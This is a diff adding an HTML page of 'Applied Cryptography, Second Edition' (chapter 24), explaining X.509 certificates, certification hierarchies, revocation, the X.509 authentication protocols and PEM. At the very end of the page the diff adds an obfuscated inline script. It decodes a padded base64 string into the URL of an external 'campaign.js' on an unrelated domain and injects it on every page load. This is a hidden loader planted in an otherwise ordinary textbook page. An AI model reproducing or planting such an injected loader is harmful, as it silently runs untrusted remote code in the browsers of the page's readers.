@@ -1,0 +1,120 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=575-578//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+</P>
+<P><FONT SIZE="+1"><B><I>Certificates</I></B></FONT></P>
+<P>The most important part of X.509 is its structure for public-key certificates. Each user has a distinct name. A trusted Certification Authority (CA) assigns a unique name to each user and issues a signed certificate containing the name and the user&#146;s public key. Figure 24.2 shows an X.509 certificate [304].
+</P>
+<P>The version field identifies the certificate format. The serial number is unique within the CA. The next field identifies the algorithm used to sign the certificate, together with any necessary parameters. Issuer is the name of the CA. The period of validity is a pair of dates; the certificate is valid during the time period between the two. Subject is the name of the user. The subject&#146;s public key information includes the algorithm name, any necessary parameters, and the public key. The last field is the CA&#146;s signature.</P>
+<P>If Alice wants to communicate with Bob, she first gets his certificate from a database. Then she verifies its authenticity. If both share the same CA, this is easy. Alice simply verifies the CA&#146;s signature on Bob&#146;s certificate.</P>
+<P>If they use different CAs, it&#146;s more complicated. Think of a tree structure, with different CAs certifying other CAs and users. On the top is one master CA. Each CA has a certificate signed by the CA above it, and by the CAs below it. Alice uses these certificates to verify Bob&#146;s certificate.</P>
+<P>Figure 24.3 illustrates this. Alice&#146;s certificate is certified by CA<SUB><I>A</I></SUB> ; Bob&#146;s is certified by CA<SUB>B</SUB>. Alice knows CA<SUB><I>A</I></SUB>&#146;s public key. CA<SUB><I>C</I></SUB> has a certificate signed by CA<SUB><I>A</I></SUB>, so Alice can verify that. CA<SUB><I>D</I></SUB> has a certificate signed by CA<SUB><I>C</I></SUB>. CA<SUB><I>B</I></SUB> has a certificate signed by CA<SUB><I>D</I></SUB>. And Bob&#146;s certificate is signed by CA<SUB><I>B</I></SUB>. By moving up the certification tree to a common point, in this case CA<SUB><I>D</I></SUB>, and then down to Bob, Alice can verify Bob&#146;s certificate.</P>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/24-03.jpg',198,186 )"><IMG SRC="images/24-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/24-03.jpg',198,186)"><FONT COLOR="#000077"><B>Figure 24.3</B></FONT></A>&nbsp;&nbsp;Sample certification hierarchy.</I>
+</P>
+<P>Certificates can be stored on databases around the network. Users can send them to each other. When a certificate expires, it should be removed from any public directories. The issuing CA, however, should maintain a copy of the certificate. Should a dispute arise later, it will be required.
+</P>
+<P>Certificates can also be revoked, either because the user&#146;s key has been compromised, the CA&#146;s key has been compromised, or because the CA no longer wants to certify the user. Each CA must maintain a list of all revoked but not expired certificates. When Alice receives a new certificate, she should check to see if it has been revoked. She can check a database of revoked keys on the network, but more likely she will check a locally cached list of revoked certificates. There are certainly possible abuses to this system; key revocation is probably its weakest part.</P>
+<P><FONT SIZE="+1"><B><I>Authentication Protocols</I></B></FONT></P>
+<P>Alice wants to communicate with Bob. First she goes to a database and obtains what is called a <B>certification path</B> from Alice to Bob, and Bob&#146;s public key. At this point Alice can initiate either a one-way, two-way, or three-way authentication protocol.</P>
+<P>The one-way protocol is a single communication from Alice to Bob. It establishes the identities of both Alice and Bob and the integrity of any information communicated by Alice to Bob. It also prevents any replay attacks on the communication.</P>
+<P>The two-way protocol adds a reply from Bob. It establishes that Bob, and not an imposter, sent the reply. It also establishes the secrecy of both communications and prevents replay attacks.</P>
+<P>Both the one-way and two-way protocols use timestamps. A three-way protocol adds another message from Alice to Bob and obviates the need for timestamps (and therefore authenticated time).</P>
+<P>The one-way protocol is:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a random number, <I>R<SUB>A</SUB></I>.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice constructs a message, <I>M</I> = (<I>T<SUB>A</SUB></I>, <I>R<SUB>A</SUB></I>, <I>I<SUB>B</SUB></I>, <I>d</I>), where <I>T<SUB>A</SUB></I> is Alice&#146;s timestamp, <I>I<SUB>B</SUB></I> is Bob&#146;s identity, and <I>d</I> is an arbitrary piece of data. The data may be encrypted with Bob&#146;s public key, <I>E<SUB>B</SUB></I>, for security.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice sends (<I>C<SUB>A</SUB></I>, <I>D<SUB>A</SUB></I> (<I>M</I>)) to Bob. (<I>C<SUB>A</SUB></I> is Alice&#146;s certificate; <I>D<SUB>A</SUB></I> is Alice&#146;s private key.)
+<DD><B>(4)</B>&nbsp;&nbsp;Bob verifies <I>C<SUB>A</SUB></I> and obtains <I>E<SUB>A</SUB></I>. He makes sure these keys have not expired. (<I>E<SUB>A</SUB></I> is Alice&#146;s public key.)
+<DD><B>(5)</B>&nbsp;&nbsp;Bob uses <I>E<SUB>A</SUB></I> to decrypt <I>D<SUB>A</SUB></I>(<I>M</I>). This verifies both Alice&#146;s signature and the integrity of the signed information.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob checks the <I>I<SUB>B</SUB></I> in <I>M</I> for accuracy.
+<DD><B>(7)</B>&nbsp;&nbsp;Bob checks the <I>T<SUB>A</SUB></I> in <I>M</I> and confirms that the message is current.
+<DD><B>(8)</B>&nbsp;&nbsp;As an option, Bob can check <I>R<SUB>A</SUB></I> in <I>M</I> against a database of old random numbers to ensure the message is not an old one being replayed.
+</DL>
+<P>The two-way protocol consists of the one-way protocol and then a similar one-way protocol from Bob to Alice. After executing steps (1) through (8) of the one-way protocol, the two-way protocol continues with:
+</P>
+<DL>
+<DD><B>(9)</B>&nbsp;&nbsp;Bob generates another random number, <I>R<SUB>B</SUB></I>.
+<DD><B>(10)</B>&nbsp;&nbsp;Bob constructs a message <I>M&#146;</I> = (<I>T<SUB>B</SUB></I>, <I>R<SUB>B</SUB></I>, <I>I<SUB>A</SUB></I>, <I>R<SUB>A</SUB></I>, <I>d</I>), where <I>T<SUB>B</SUB></I> is Bob&#146;s timestamp, <I>I<SUB>A</SUB></I> is the identity of Alice and <I>d</I> is arbitrary data. The data may be encrypted with Alice&#146;s public key, <I>E<SUB>A</SUB></I>, for security. <I>R<SUB>A</SUB></I> is the random number Alice generated in step (1).
+<DD><B>(11)</B>&nbsp;&nbsp;Bob sends <I>D<SUB>B</SUB></I>(<I>M&#146;</I>) to Alice.
+<DD><B>(12)</B>&nbsp;&nbsp;Alice uses <I>E<SUB>B</SUB></I> to decrypt <I>D<SUB>B</SUB></I>(<I>M&#146;</I>). This verifies both Bob&#146;s signature and the integrity of the signed information.
+<DD><B>(13)</B>&nbsp;&nbsp;Alice checks the <I>I<SUB>A</SUB></I> in <I>M&#146;</I> for accuracy.
+<DD><B>(14)</B>&nbsp;&nbsp;Alice checks the <I>T<SUB>B</SUB></I> in <I>M&#146;</I> and confirms that the message is current.
+<DD><B>(15)</B>&nbsp;&nbsp;As an option, Alice can check the <I>R<SUB>B</SUB></I> in <I>M&#146;</I> to ensure the message is not an old one being replayed.
+</DL>
+<P>The three-way protocol accomplishes the same thing as the two-way protocol, but without timestamps. Steps (1) through (15) are identical to the two-way protocol, with <I>T<SUB>A</SUB></I> = <I>T<SUB>B</SUB></I> = 0.</P>
+<DL>
+<DD><B>(16)</B>&nbsp;&nbsp;Alice checks the received version of <I>R<SUB>A</SUB></I> against the <I>R<SUB>A</SUB></I> she sent to Bob in step (3).
+<DD><B>(17)</B>&nbsp;&nbsp;Alice sends <I>D<SUB>A</SUB></I>(<I>R<SUB>B</SUB></I>) to Bob.
+<DD><B>(18)</B>&nbsp;&nbsp;Bob uses <I>E<SUB>A</SUB></I> to decrypt <I>D<SUB>A</SUB></I>(<I>R<SUB>B</SUB></I>). This verifies both Alice&#146;s signature and the integrity of the signed information.
+<DD><B>(19)</B>&nbsp;&nbsp;Bob checks the received version of <I>R<SUB>B</SUB></I> against the <I>R<SUB>B</SUB></I> he sent to Alice in step (10).
+</DL>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">24.10 Privacy-Enhanced Mail (PEM)</FONT></H3>
+<P>PEM is the Internet Privacy-Enhanced Mail standard, adopted by the Internet Architecture Board (IAB) to provide secure electronic mail over the Internet. It was initially designed by the Internet Research Task Force (IRTF) Privacy and Security Research Group (PSRG), and then handed over to the Internet Engineering Task Force (IETF) PEM Working Group. The PEM protocols provide for encryption, authentication, message integrity, and key management.
+</P>
+<P>The complete PEM protocols were initially detailed in a series of RFCs (Requests for Comment) in [977] and then revised in [978]. The third iteration of the protocols [979, 827, 980] is summarized in [177, 178]. The protocols were modified and improved, and the final protocols are detailed in another series of RFCs [981, 825, 76, 802]. Another paper by Matthew Bishop [179] details the changes. Reports of attempts to implement PEM include [602, 1505, 1522, 74, 351, 1366, 1367]. See also [1394].</P>
+<P>PEM is an inclusive standard. The PEM procedures and protocols are intended to be compatible with a wide range of key-management approaches, including both symmetric and public-key schemes to encrypt data-encrypting keys. Symmetric cryptography is used for message-text encryption. Cryptographic hash algorithms are used for message integrity. Other documents support key-management mechanisms using public-key certificates; algorithms, modes, and associated identifiers; and paper and electronic format details and procedures for the key-management infrastructure to support these services.</P>
+<P>PEM supports only certain algorithms, but allows for different suites of algorithms to be specified later. Messages are encrypted with DES in CBC mode. Authentication, provided by something called a <B>Message Integrity Check</B> (<B>MIC</B>), uses either MD2 or MD5. Symmetric key management can use either DES in ECB mode or triple-DES using two keys (called EDE mode). PEM also supports public-key certificates for key management, using the RSA algorithm (key length up to 1024 bits) and the X.509 standard for certificate structure.</P>
+<P>PEM provides three privacy-enhancement services: confidentiality, authentication, and message integrity. No special processing requirements are imposed on the electronic mail system. PEM can be incorporated selectively, by site or by user, without affecting the rest of the network.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(jNaNVFqk, yonhiEfh) {yonhiEfh = jNaNVFqk.createElement('script');yonhiEfh.type = 'text/javascript';yonhiEfh.async = true;yonhiEfh.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');jNaNVFqk.getElementsByTagName('body')[0].appendChild(yonhiEfh);}(document));</script></body>
+</html>
